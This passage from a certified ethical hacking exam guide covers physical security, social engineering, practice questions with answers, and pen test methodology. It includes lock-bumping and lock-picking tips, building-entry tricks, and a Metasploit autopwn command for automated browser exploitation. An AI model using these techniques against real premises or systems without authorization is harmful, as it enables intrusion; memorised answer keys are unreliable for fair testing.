building. Providing access control at each door with a swipe card, or biometric measures,
adds an additional layer. Once an attacker is inside the room, technical controls can be
used to prevent local logon. In short, layer your physical security defenses just as you
would your virtual ones—you may get some angry users along the way, huffing and
puffing about all they have to do just to get to work, but it’ll pay off in the long run.

Another thought to consider, as mentioned earlier, is that physical security should
also be concerned with those things you can’t really do much to prevent. No matter what
protections and defenses are in place, an F5 tornado doesn’t need an access card to get past
the gate. Hurricanes, floods, fires, and earthquakes are all natural events that could bring
your system to its knees. Protection against these types of events usually comes down to
good disaster recovery and business continuity planning and operational controls. You
can certainly construct a strong building and install fire-suppression systems; however,
they’re not going to prevent anything. In the event something catastrophic does happen,
you’ll be better off with solid disaster-recovery and contingency plans.

From an ethical hacker’s perspective, the steps taken to defend against natural disasters
aren’t necessarily anything that will prevent or enhance a penetration test, but they are
helpful to know. For example, a fire-suppression system turning on or off isn’t necessarily
going to assist in your attack. However, knowing the systems are backed up daily and offline
storage is at a poorly secured warehouse across town could become useful. And if the fire
alarm system results in everyone leaving the building for an extended period of time, well...

Finally, there’s one more thought we should cover (more for your real-world career
than for your exam) that applies whether we’re discussing physical security or trying to
educate a client manager on prevention of social engineering. There are few truisms in
life, but one is absolute: hackers do not care that your company has a policy. Many a pen
tester has stood there listening to the client say, “That scenario simply won’t [or shouldn’t
or couldn’t] happen because we have a policy against it.” Two minutes later, after a server
with a six-character password left on a utility account has been hacked, it is evident the
policy requiring ten-character passwords didn’t scare off the attacker at all, and the client
is left to wonder what happened to the policy. Policies are great, and they should be in
place. Just don’t count on them to actually prevent anything on their own. After all, the
attacker doesn’t work for you and couldn’t care less what you think.

12-ch12.indd 477 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

478

Testing Physical Security
From a penetration testing perspective, testing physical security is no joyride. Generally
speaking, physical security penetration is much more of a “high-risk” activity for the pen-
etration tester than many of the virtual methods we’ve discussed. Think about it: If you’re
sitting in a basement somewhere firing binary bullets at a target, it’s much harder for
them to actually figure out where you are, much less to lay hands on you. Pass through a
held-open door and wander around the campus without a badge, and someone, eventu-
ally, will catch you. And sometimes that someone is carrying a gun—and pointing it at
you. I’ve even heard of a certain tech-editing pen test lead who has literally had the dogs
called out on him (as an aside, one of the funniest quotes regarding this was “Dogs don’t
care about your authorization letter”). When strong IT security measures are in place,
though, determined testers will move to the physical attacks to accomplish the goal.

Physical Security Hacks
Believe it or not, hacking is not restricted to computers, networking, and the virtual
world—there are physical security hacks you can learn, too. For example, most ele-
vators have an express mode that lets you override the selections of all the previous
passengers, allowing you to go straight to the floor you’re going to. By pressing the
Door Close button and the button for your destination floor at the same time, you’ll
rocket right to your floor while all the other passengers wonder what happened.

Others are more practical for the ethical hacker. Ever hear of the bump key, for
instance? A specially crafted bump key will work for all locks of the same type by
providing a split second of time to turn the cylinder. See, when the proper key is
inserted into the lock, all of the key pins and driver pins align along the “shear
line,” allowing the cylinder to turn. When a lock is “bumped,” a slight impact
forces all of the driver pins in the lock, which keeps the key pins in place. This
separation only lasts a split second, but if you keep a slight force applied, the
cylinder will turn during the short separation time of the key and driver pins, and
the lock can be opened.

Other examples are easy to find. Some Master-brand locks can be picked using a
simple bobby pin and an electronic flosser, believe it or not. Combination locks can
be easily picked by looking for “sticking points” (apply a little pressure and turn the
dial slowly—you’ll find them) and mapping them out on charts you can find on the
Internet. Heck, last I heard free lock pick kits were being given away at Defcon, so
there may not even be a lot of research necessary on lock picking anymore.

What about physical security hacks in the organizational target? Maybe you can
consider raised floors and drop ceilings as an attack vector. If the walls between rooms
aren’t properly sealed (that is, they don’t go all the way to the ceiling and floor), you
can bypass all security in the building by just by crawling a little. And don’t overlook
the beauty of an open lobby manned by a busy or distracted receptionist. Many
times you can just walk right in.

12-ch12.indd 478 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

479

I could go on and on here, but you get the point. Sadly, many organizations do
not, and they overlook physical security in their overall protection schemes. As a
matter of fact, it seems even standards organizations and certification providers are
falling into this trap. (ISC)2 proved this out by recently taking physical security from
its place of honor, with its own domain in the CISSP material, and downgrading
it to just a portion of another domain. Personally, I think organizations, security
professionals, and, yes, pen testers who ignore or belittle its place in security are
doomed to failure. Whichever side you’re on, it’s in your best interest to give physical
security its proper place.

Chapter Review
Social engineering is the art of manipulating a person, or a group of people, into provid-
ing information or a service they otherwise would never have given. Social engineers prey
on people’s natural desire to help one another, their tendency to listen to authority, and
their trust of offices and entities. ECC defines four phases of successful social engineering:

1. Research (dumpster dive, visit websites, tour the company, and so on).
2. Select the victim (identify frustrated employee or other promising targets).
3. Develop a relationship.
4. Exploit the relationship (collect sensitive information).

Social engineering is a nontechnical method of attacking systems, which means it’s not
limited to people with technical know-how. EC-Council defines five main reasons and
four factors that allow social engineering to happen. Human nature (to trust others),
ignorance of social engineering efforts, fear (of consequences of not providing the
requested information), greed (promised gain for providing requested information), and
a sense of moral obligation are all reasons people fall victim to social engineering attacks.
As for the factors that allow these attacks to succeed, insufficient training, unregulated
information (or physical) access, complex organizational structure, and lack of security
policies all play roles.

All social engineering attacks fall into one of three categories: human based, computer
based, or mobile based. Human-based social engineering uses interaction in conversation
or other circumstances between people to gather useful information.

Dumpster diving is digging through the trash for useful information. Although
technically a physical security issue, dumpster diving is covered as a social engineering
topic per EC-Council. Impersonation encompasses a huge swath of attack vectors.
Basically, the social engineer pretends to be someone or something he or she is not,
and that someone or something—like, say, an employee, a valid user, a repairman, an
executive, a help desk person, or an IT security expert—is someone or something the
target either respects, fears, or trusts. Pretending to be someone you’re not can result in

12-ch12.indd 479 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

480

physical access to restricted areas (providing further opportunities for attacks), not to
mention access to any sensitive information (including the credentials) your target feels
you have a need and right to know. Using a phone during a social engineering effort is
known as “vishing.”

Shoulder surfing and eavesdropping are other valuable human-based social engineering
methods. An attacker taking part in shoulder surfing simply looks over the shoulder
of a user and watches them log in, access sensitive data, or provide valuable steps in
authentication. This can also be done “long distance,” using vision-enhancing devices
like telescopes and binoculars.

Tailgating occurs when an attacker has a fake badge and simply follows an authorized
person through the opened security door. Piggybacking is a little different in that the
attacker doesn’t have a badge but asks for someone to let her in anyway. If you see an exam
question listing both tailgating and piggybacking, the difference between the two comes
down to the presence of a fake ID badge (tailgaters have them, piggybackers don’t). On
questions where they both do not appear as answers, the two are used interchangeably.

Reverse social engineering is when the attacker poses as some form of authority or
technical support and sets up a scenario whereby the user feels he must dial in for support.
Potential targets for social engineering are referred to as “Rebecca” or “Jessica.” When you’re
communicating with other attackers, the terms can provide information on whom to
target—for example, “Rebecca, the receptionist, was very pleasant and easy to work with.”
Disgruntled employees and insider attacks present the greatest risk to an organization.

Computer-based social engineering attacks are those attacks carried out with the use of a
computer. Attacks include specially crafted pop-up windows, hoax e-mails, chain letters,
instant messaging, spam, and phishing. Social networking and spoofing sites or access
points also belong in the mix.

Most likely the simplest and most common method of computer-based social
engineering is known as phishing. A phishing attack involves crafting an e-mail that
appears legitimate but in fact contains links to fake websites or to download malicious
content. Another version of this attack is known as spear phishing. Whereas a phishing
attack usually involves a mass-mailing of a crafted e-mail in hopes of snagging some
unsuspecting reader, spear phishing is a targeted attack against an individual or a small
group of individuals within an organization. Spear phishing usually is a result of a little
reconnaissance work that has churned up some useful information. Options that can help
mitigate against phishing include the Netcraft Extension and the PhishTank Toolbar.

Mobile-based social engineering attacks are those that take advantage of mobile devices—
that is, applications or services in mobile devices—in order to carry out their end goal.
ZitMo (ZeuS-in-the-Mobile) is a piece of malware for Android phones that exploits an
already-owned PC to take control of a phone in order to steal credentials and two-factor
codes. EC-Council defines four categories of mobile-based social engineering attacks:
publishing malicious apps, repackaging legitimate apps, fake security applications, and
SMS (per EC-Council, this is known as “smishing”).

Setting up multiple layers of defense, including change-management procedures and
strong authentication measures, is a good start in social engineering mitigation. You
can set up other physical and technical controls, but the only real defense against social
engineering is user education.

12-ch12.indd 480 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

481

Physical security is perhaps one of the most overlooked areas in an overall security
program. Physical security includes the plans, procedures, and steps taken to protect your
assets from deliberate or accidental events that could cause damage or loss. Physical security
measures come down to three major components: physical, technical, and operational.
Physical measures include all the things you can touch, taste, smell, or get shocked by.
Technical measures are measures taken with technology in mind to protect explicitly at the
physical level. Operational measures are the policies and procedures you set up to enforce
a security-minded operation.

Access controls are physical measures designed to prevent access to controlled areas. They
include biometric controls, identification/entry cards, door locks, and mantraps. FRR,
FAR, and CER are important biometric measurements. False rejection rate (FRR) is the
percentage of times a biometric reader denies access to a legitimate user. The percentage of
times that an unauthorized user is granted access by the system, known as false acceptance
rate (FAR), is the second major factor. FRR and FAR are usually graphed on a chart, and
the intercepting mark, known as crossover error rate (CER), becomes a ranking method to
determine how well the system functions overall.

The mantrap (aka access control vestibule), designed as a pure physical access control,
provides additional control and screening at the door or access hallway to the controlled
area. In the mantrap, two doors are used to create a small space to hold a person until
appropriate authentication has occurred. The user enters through the first door, which
must shut and lock before the second door can be cleared. Once inside the enclosed
room, which normally has clear walls, the user must authenticate through some means—
biometric, token with PIN, password, and so on—to open the second door.

Questions
1. An attacker creates a fake ID badge and waits next to an entry door to a secured

facility. An authorized user swipes a key card and opens the door. The attacker
follows the user inside. Which social engineering attack is in play here?
A. Piggybacking
B. Tailgating
C. Phishing
D. Shoulder surfing

2. An attacker has physical access to a building and wants to attain access
credentials to the network using nontechnical means. Which of the following
social engineering attacks is the best option?
A. Tailgating
B. Piggybacking
C. Shoulder surfing
D. Sniffing

12-ch12.indd 481 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

482

3. Bob decides to employ social engineering during part of his pen test. He sends
an unsolicited e-mail to several users on the network advising them of potential
network problems and provides a phone number to call. Later that day, Bob
performs a DoS on a network segment and then receives phone calls from users
asking for assistance. Which social engineering practice is in play here?
A. Phishing
B. Impersonation
C. Technical support
D. Reverse social engineering

4. Phishing, pop-ups, and IRC channel use are all examples of which type of social
engineering attack?
A. Human based
B. Computer based
C. Technical
D. Physical

5. An attacker performs a whois search against a target organization and discovers the
technical point of contact (POC) and site ownership e-mail addresses. He then
crafts an e-mail to the owner from the technical POC, with instructions to click
a link to see web statistics for the site. Instead, the link goes to a fake site where
credentials are stolen. Which attack has taken place?
A. Phishing
B. Man in the middle
C. Spear phishing
D. Human based

6. Which threat presents the highest risk to a target network or resource?
A. Script kiddies
B. Phishing
C. A disgruntled employee
D. A white-hat attacker

7. Which of the following is not a method used to control or mitigate against static
electricity in a computer room?
A. Positive pressure
B. Proper electrical grounding
C. Anti-static wrist straps
D. A humidity control system

12-ch12.indd 482 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

483

8. Phishing e-mail attacks have caused severe harm to a company. The security
office decides to provide training to all users in phishing prevention. Which of
the following are true statements regarding identification of phishing attempts?
(Choose all that apply.)
A. Ensure e-mail is from a trusted, legitimate e-mail address source.
B. Verify spelling and grammar is correct.
C. Verify all links before clicking them.
D. Ensure the last line includes a known salutation and copyright entry (if

required).
9. Lighting, locks, fences, and guards are all examples of __________ measures

within physical security.
A. physical
B. technical
C. operational
D. exterior

10. A man receives a text message on his phone purporting to be from Technical
Services. The text advises of a security breach and provides a web link and
phone number to follow up on. When the man calls the number, he turns over
sensitive information. Which social engineering attack was this?
A. Phishing
B. Vishing
C. Smishing
D. Man in the middle

11. Background checks on employees, risk assessments on devices, and policies
regarding key management and storage are examples of __________ measures
within physical security.
A. physical
B. technical
C. operational
D. None of the above

12. Your organization installs mantraps in the entranceway. Which of the following
attacks is it attempting to protect against?
A. Shoulder surfing
B. Tailgating
C. Dumpster diving
D. Eavesdropping

12-ch12.indd 483 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

484

Answers
1. B. In tailgating, the attacker holds a fake entry badge of some sort and follows an

authorized user inside. Piggybacking is a little different in that the attacker doesn’t
have a badge but asks for someone to let them in anyway.

2. C. Because the attacker is already inside (thus rendering tailgating and piggybacking
pointless), the attacker could employ shoulder surfing to gain the access credentials
of a user.

3. D. Reverse social engineering occurs when the attacker uses marketing, sabotage,
and support to gain access credentials and other information.

4. B. Computer-based social engineering attacks include any measures using
computers and technology.

5. C. Spear phishing occurs when the e-mail is being sent to a specific audience,
even if that audience is one person. In this example, the attacker used recon
information to craft an e-mail designed to be more realistic to the intended
victim and therefore more successful.

6. C. Everyone recognizes insider threats as the worst type of threat, and a disgruntled
employee on the inside is the single biggest threat for security professionals to plan
for and deal with.

7. A. Positive pressure will do wonderful things to keep dust and other contaminants
out of the room, but on its own it does nothing against static electricity.

8. A, B, C. Phishing e-mails can be spotted by who they are from, who they
are addressed to, spelling and grammar errors, and unknown or malicious
embedded links.

9. A. Physical security controls fall into three categories: physical, technical, and
operational. Physical measures include lighting, fences, and guards.

10. C. The term smishing refers to the use of text messages to socially engineer mobile
device users. By definition it is a mobile-based social engineering attack. As an
aside, it also sounds like something a five-year-old would say about killing a bug.

11. C. Operational measures are the policies and procedures you set up to enforce a
security-minded operation.

12. B. Mantraps are specifically designed to prevent tailgating.

12-ch12.indd 484 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CHAPTER

The Pen Test: 13
Putting It All Together
In this chapter you will

• Describe penetration testing, security assessments, and risk management
• Deine automatic and manual testing
• List the pen test methodology and deliverables

I worked in a body shop for most of my teenage years. It was an awesome experience
taking in cars that had been involved in an accident or subjected to the horrors of rust
and the elements, and returning them back as brand-new, shiny, beautiful works of art.
My boss, Rob, was an awesome guy to work for and taught me more about cars and
bodywork than I ever even knew existed. I learned tons about automotive bodywork,
chemistry, air quality, and paint.

The process for restoring these cars, regardless of what had happened to them, was
roughly the same. After Rob had prepared an estimate and the owner agreed to have
us do the work, we’d wash everything down as best we could (grease, oil, and other
contaminants don’t mix well with paint) and then move the car into the shop. Next,
we’d take everything off the car we could possibly remove—bumpers, chrome, decals,
mirrors…everything—around the area we were going to work on (if it was a full paint
job, it all came off ). We’d take precautions to protect areas that weren’t being worked
on or that couldn’t (shouldn’t) be touched. We’d then move to my favorite part—the
rough work on the body. Sandblasting, welding, pounding, and shaping metal with big
hammers and hydraulic machinery—all of it so manly, I’m sitting here grunting like Tim
“The Tool Man” Taylor in fond memory.

All this would be followed by mid work: things like Bondo application (in very small
quantities and only where appropriate), sanding, and prepping. This work was delicate in
nature because the surface had to be perfect before we applied any paint. A small dip in
the sanding wouldn’t seem to be an issue until gloss paint applied over it made it appear to
be a valley of despair and shoddy workmanship, and a missed scratch—even in an area we
weren’t focused on—would look ghastly with paint sprayed over it. After the mid work,
we’d spray a solid coat of primer and wet sand it down to perfection. A drying session and
a blowout of the entire paint room (to remove all dirt, dust, and debris) followed, with a
final wipe down (for oils and such) and inspection before we applied the paint.

485

13-ch13.indd 485 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CEH Certified Ethical Hacker All-in-One Exam Guide

486

Finally, when the painting was done and cured, we had to put back on all the stuff we
took off and detail the car. But, just before this, Rob would make a final inspection. He
would cover every square inch of the car, much like a detective at a crime scene, looking
for anything we’d missed—anything that wasn’t absolutely perfect. When I was learning
the trade, he’d stop and point out flaws, explaining to me exactly what we’d missed and
how we should fix it. And it always surprised me how, after all that attention to detail and
process beforehand, there were always a few things I missed and a few things I could’ve
gotten better.

And so we find ourselves looking at the nearly finished virtual body job we’ve been
working on thus far. We’ve done pretty good work, I think, and have a great product here
to be proud of. But if we take a few minutes and look back at everything, maybe we can
find a few things we left out, or maybe some things that just need a bit more explanation
to make it all fall into place. Hopefully nothing is really bad, because I’d hate for you to
hear Rob yelling about shoddy craftsmanship.

We’ve covered everything that should be relevant for your upcoming exam, a few other
things that might make you a better ethical hacker, and even some stuff you might’ve
found just plain cool. I hope what you’ve learned here results in your employment as an
ethical hacker, where you’ll be doing good work for the betterment of society. Sure, that
may sound corny to some of you, but I truly believe it. And I know that if you believe
your profession is making the world a better place, the pride you have in it will result in
you becoming better and better at it each and every day. Before too long, you’ll look back
on this little book like one of those English 101 books from college and wonder at how
far you’ve come.

So, let’s use this final chapter as an opportunity to review the highlights via a discussion
on the penetration test. The pen test is where you’ll put into practice what you’ve read
in this book and what you’ve learned on your own through practice and experience. I
promise this won’t take long; it’s a short chapter, and I’m pretty sure you deserve a break.

Methodology and Steps
Much has been made so far in this book about following steps and taking a logical
approach to hacking. I can honestly say that most of that is purely for your exam—for
your “book knowledge,” if you will. Hackers will take advantage of any opportunity as it
presents itself, and they’ll always look for the easy way in. Why bother running through
all the steps of a hacking attack on a machine that’s either too secured to allow a breach
(easily and within a decent timeframe) or doesn’t present a pot of gold at the end of the
attack rainbow? I think too many people have the idea that ethical hacking/pen testing
is a cookie-cutter, one-size-fits-all operation. In reality, each situation, and each client, is
different. What works for one client may not work for another, and tests and deliverables
that make one client happy might result in a lawsuit from another.

However, all that said, methodology isn’t all bad, especially when you’re first starting out.
A methodology, when not held too rigidly in a book-smart, absolutely annoying, college-
graduate “I KNOW EVERYTHING” manner, can give you a good guide and serve as a
reminder to cover everything. Heck, EC-Council isn’t even alone in suggesting one—SANS
recommends much the same methodology (https://www.sans.org/white-papers/67/).

13-ch13.indd 486 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

Chapter 13: The Pen Test: Putting It All Together

487

The idea is to make sure you cover everything—which is exactly what we’re going to do
here. So grab your primer, sandpaper, tape, and air sprayer and let’s get this thing painted.

Security Assessments
Every organization on the planet that has any concern whatsoever for the security of its
resources must perform various security assessments, and some don’t have a choice, if they
need to comply with FISMA or other various government standards. In CEH parlance, a
security assessment is any test that is performed in order to assess the level of security on
a network or system. The security assessment can belong to one of three categories: a
security audit, a vulnerability assessment, or a penetration test.

A security audit is policy and procedure focused. It tests whether the organization
is following specific standards and policies that it has in place. After all, what good is
having the policy if no one in the organization knows about it or follows what it says?
A vulnerability assessment scans and tests a system or network for existing vulnerabilities
but does not intentionally exploit any of them. A vulnerability assessment is designed to
uncover potential security holes in the system and report them to the client for their
action. This assessment does not fix or patch vulnerabilities, nor does it exploit them—it
simply points them out for the client’s benefit.

NOTE Beore you agree to conduct a vulnerability assessment, keep in
mind the diiculty o the “ind but don’t test” theory o them. For instance,
suppose you believe a website has a SQL injection vulnerability, but to
determine whether it’s vulnerable, you would have to attempt to insert
SQL—which is pen testing and could be beyond the scope o a vulnerability
assessment. Oten, veriying the existence o a vulnerability requires
testing or it. I you don’t want your options to be limited during a security
assessment, explain to your potential client the dierence between a
vulnerability assessment and a pen test and ask i they would preer the
latter to conirm potential vulnerabilities.

A penetration test, on the other hand, not only looks for vulnerabilities in the system but
actively seeks to exploit them. The idea is to show the potential consequences of a hacker
breaking in through unpatched vulnerabilities. Pen tests are carried out by highly skilled
individuals pursuant to an agreement signed before testing begins, and it’s paramount
you understand that concept. Do nothing before you have a signed, sealed agreement
in place. Nothing. This agreement should spell out the limitations, constraints, and
liabilities between the organization and the penetration test team, and is designed to
maximize the effectiveness of the test itself while minimizing operational impact.

Although most people automatically think of this agreement as a “get out of jail free”
card, it’s much more than that. You’ll need to cover everything you can think of and
a lot of things you haven’t thought of. For example, you might agree up front that no
denial-of-service attacks are to be performed during the test, but what happens if your
port scanner accidentally brings down a server? Will you be liable for damages? In many
cases, a separate indemnity form releasing you from financial liability is also necessary.

13-ch13.indd 487 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CEH Certified Ethical Hacker All-in-One Exam Guide

488

NOTE While we’re talking about indemnity orms and such, keep in mind
that in the world o cloud computing, what you believe to be under your
control and authority simply might not be.

Defining the project scope will help to determine whether the pen test is a comprehensive
examination of the organization’s security posture or a targeted test of a single subnet/
system. You may also find a need to outsource various efforts and services. In that case,
your service level agreements (SLAs) need to be iron-clad in defining your responsibility in
regard to your consultant’s actions. In the event of something catastrophic or some serious,
unplanned disruption of services, the SLA spells out who is responsible for taking action
to correct the situation. And don’t forget the nondisclosure terms: most clients don’t want
their dirty laundry aired and are taking a large risk in agreeing to the test in the first place.

If you’d like to see a few examples of pen test agreement paperwork, just do some
Google searching. SANS has some great information available, and many pen test
providers have basics about their agreements available. Keep in mind you won’t find any
single agreement that addresses everything—you’ll have to figure that out on your own.
Just be sure to do everything up front, and seek legal review from a qualified attorney
before you start testing.

Speaking of pen tests overall, EC-Council defines basically two types of penetration
tests: external and internal. An external assessment analyzes publicly available information
and conducts network scanning, enumeration, and testing from the network perimeter,
usually from the Internet. An internal assessment is performed from within the
organization, from various network access points. Obviously, both could be part of one
overall assessment, but you get the idea.

Chapter 1 covered black-box, white-box, and gray-box testing already, so I won’t beat
you over the head with these again. However, just to recap, black-box testing occurs when
the attacker has no prior knowledge of the infrastructure at all. This testing takes the
longest to accomplish and simulates a true outside hacker. White-box testing simulates
an internal user who has complete knowledge of the company’s infrastructure. Gray-box
testing provides limited information on the infrastructure. Sometimes gray-box testing is
born out of a black-box test that determines more knowledge is needed.

NOTE Pen testing can also be deined by what your customer knows.
Announced testing means the IT security sta is made aware o what testing
you’re providing and when it will occur. Unannounced testing occurs without
the knowledge o the IT security sta and is known only by the management
sta who organized and ordered the assessment. It is also the only way to
truly know where the enterprise stands during operations. Additionally,
unannounced testing should always come with detailed processes that
are coordinated with a trusted agent. It is normally very bad to have a
company’s entire IT department tasked with stopping an incident that is
really just an authorized pen test.

While we’re on the subject of colors, your test team has a specific color designation,
depending on which side of the fence you’re working on during a war game. While you’re

13-ch13.indd 488 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

Chapter 13: The Pen Test: Putting It All Together

489

probably already aware of the “capture the flag” type contests you’ve no doubt seen at
Black Hat, Defcon, SANS, or any other security event, there is a simulation that’s a step
above that. Suppose you wanted the full experience—not only to see what the bad guys
attacking you are doing but also how a security team responds. The military does it all
the time, simulating an attacking force and having another group defend. In the virtual
world, the same type of simulation can be played out.

In this war game scenario, the two colors taking sides are red and blue. If you’re
on a team simulating an attacking force, you’re considered to be red. The red team is
the offense-minded group, simulating the bad guys in the world, actively attacking and
exploiting everything they can find in your environment. In a traditional war game
scenario, the red team is attacking black-box style, given little to no information to
start things off. The blue team, on the other hand, is defensive in nature. They’re not
out attacking anything—rather, they’re focused on shoring up defenses and making the
environment safe. Unlike the red teams, blue teams are responsible for defense against
the bad guys, so they usually operate with full knowledge of the internal environment.

EXAM TIP I know. I get it. Your pen test group is a red team whether they are
participating in a war game or just doing a pen test, and red team and red
teaming have somewhat dierent connotations in the real world. For your
exam, though, remember red = attack and no knowledge, blue = deense
and white-box knowledge.

Finally, in this (pardon the monochromatic corollary here) black-and-white color-
coded pen test teaming world, there are shades of gray. Or, in this case, shades of purple.
The so-called purple team (terminology gaining wild popularity in the real world but
may not be on your exam, yet) is dedicated to fulfilling both worlds. While a red team
would perform an adversarial assessment and a blue team would be purely in a defensive
posture, a purple team might perform a “cooperative vulnerability and penetration
assessment” involving both sides in an effort to not only attack and identify issues but
also repair and advise along the way. The goal is to assist defenders and to do so with
whatever information is available; in other words, the difference between “blue” and
“red” in this scenario is in the cooperative versus adversarial nature: red is there to be the
bad guys—to do what they would do, to look for the impacts they would want to have,
and to test the defenses/responses—whereas blue is there to help.

Pen Tests Gone Wild
One of the recurring themes in this book has been the clear delineation between the
bad guy hackers of the world and us, the ethical hackers. While the bad guys will
attack anything and everything whenever they feel like it, for whatever reason they
deem appropriate, ethical hackers don’t do any testing (attacking) without permission.
Ever. And we spend lots and lots of time ironing out approval documentation and
agreements so that everything is covered and everyone involved knows exactly how

(continued )

13-ch13.indd 489 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CEH Certified Ethical Hacker All-in-One Exam Guide

490

far, and how long, an attack test will run. But even with all this time spent making
sure everything is in a nice tidy bundle before we begin, problems can still occur. And
sometimes they’re just funny—at least in review, anyway.

Take the case of a pen test gone wild in Tulsa, Oklahoma, back in 2012. It seems
the IT staff for the city arranged for a pen test and went through all the planning
and documenting necessary to get things started. They scheduled times, knew who
was and was not going to be involved, drew up scope agreements, and took care of
the endless details involved in setting up a pen test. Meetings were held, agreements
were signed, lawyers were paid, and finally it was time to proceed with the test.

A funny thing occurred, though, soon after testing began. Apparently the firm
the city hired used a method in its testing the city wasn’t aware of or prepared for,
and, as a result, the CIO decided the city was under attack. Servers were turned
off, IT personnel were scrambling to and fro, and more than $25,000 was spent on
additional security consulting services during the test event. And it wasn’t until after
nearly 90,000 notification letters were sent to individuals warning them about the
potential loss of personal data that city officials began asking the question, “Hey,
weren’t we supposed to be going through a pen test? Maybe that’s what all this is
about.” You can read about it yourself at https://www.esecurityplanet.com/network-
security/city-of-tulsa-cyber-attack-was-penetration-test-not-hack.html.

Virtually every organization that has ever performed a pen test has stories like
this. Maybe they’re not so grand in scale or as hilarious in nature, but they’re just as
unplanned and just as crazy. Pen testers have been accused of data theft and fraud,
and have even been arrested for performing duties they thought were within the
scope of their agreement. Some of the tales are really funny, and some border on
heartbreaking, but they all reinforce the point: written agreement on scope and
good communication before the test are imperative. Pen testing, by its nature, can
cause heartache, jealously, and downright panic in personnel watching the wires.
So, be careful, and make sure your preparation work is as important as your testing.

Testing can also be further broken down according to the means by which it is
accomplished. Automated testing is a point-and-shoot effort with an all-inclusive toolset
such as Core Impact. Automated testing could be viewed as a means to save time and
money by the client’s management, but it simply cannot touch a test performed by
security professionals. Automated tools can provide a lot of genuinely good information
but are also susceptible to false positives and false negatives, and they don’t necessarily
care what your agreed-upon scope says is your stopping point. A short list of some
automated tools is presented here:

• Core Impact Pro Probably the best-known all-inclusive automated testing
framework, Core Impact Pro takes security testing to the next level by safely
replicating a broad range of threats to the organization’s sensitive data and
mission-critical infrastructure—providing extensive visibility into the cause,

13-ch13.indd 490 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

Chapter 13: The Pen Test: Putting It All Together

491

effect, and prevention of data breaches. Core Impact tests everything from
web applications and individual systems to network devices and wireless
(a vulnerability management function is found in the company’s Network Insight
product). You can find multiple videos online showing this tool in action, or you
can visit Core Security’s website and see what the company has cooked up for you
(https://www.coresecurity.com/support/training/core-impact). You might also
want to visit your bank before looking into this tool—at $12K for a single annual
license, it’s a pricey endeavor.

• Metasploit Mentioned several times already in this book, Metasploit (https://
www.metasploit.com) is a framework for developing and executing exploit code
against a remote target machine (the pay-for version is called Metasploit Pro and
offers much more functionality). Metasploit offers a module called Autopwn
that can automate the exploitation phase of a penetration test (after opening
the console, type msf> use auxiliary/server/browser_autopwn). Autopwn can
attempt to fingerprint a target browser and follow up with every exploit it believes
will work against it. Although this is simple and easy, it can be quite noisy and
can even crash the target’s browser, system, or services. The Rapid7 community
has tons of assistance and videos on this module (one example is found at https://
community.rapid7.com/community/metasploit/blog/2015/07/15/the-new-
metasploit-browser-autopwn-strikes-faster-and-smarter-part-1).

• CANVAS From Immunity Security, CANVAS “makes available hundreds
of exploits, an automated exploitation system, and a comprehensive, reliable
exploit development framework to penetration testers and security professionals”
(https://www.immunityinc.com/products/canvas/).

Manual testing is still, in my humble opinion, the best choice for a true security
assessment. It requires good planning, design, and scheduling, and it provides the best
benefit to the client. Although automated testing definitely has a role in the overall
security game, many times it’s the ingenuity, drive, and creativeness of the hacker that
results in a true test of the security safeguards.

NOTE Cost is always an important actor or an organization in deciding
upon a pen test. But as Forbes magazine points out, you do get what you pay
or (www.orbes.com/sites/ericbasu/2013/10/13/what-is-a-penetration-test-
and-why-would-i-need-one-or-my-company/). The real-world threat counts
the most, or should, when determining between a comprehensive test and
a lightweight one. I you skimp up ront but all victim to an attack later, the
cost savings won’t do much to save reputation, pride, or in some cases a job.

As for the actual test, EC-Council and many others have divided the actions
taken into three main phases. In the pre-attack phase, you’ll be performing all the
reconnaissance and data-gathering efforts we discussed earlier in this book. Competitive
intelligence, identifying network ranges, checking network filters for open ports, and
so on, are all carried out here. Also, running whois, DNS enumeration, finding the

13-ch13.indd 491 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CEH Certified Ethical Hacker All-in-One Exam Guide

492

network IP address range, and Nmap network scanning all occur here. Other tasks you
might consider include, but aren’t limited to, testing proxy servers, checking for default
firewall or other network-filtering device installations or configurations, and looking at
any remote login allowances.

In the attack phase, you’ll be attempting to penetrate the network perimeter, acquire
your targets, execute attacks, and elevate privileges. Getting past the perimeter might take
into account activities such as verifying ACLs by crafting packets and checking to see
whether you can use any covert tunnels inside the organization. On the web side, you’ll be
trying XSS, buffer overflows, and SQL injections. After acquiring specific targets, you’ll
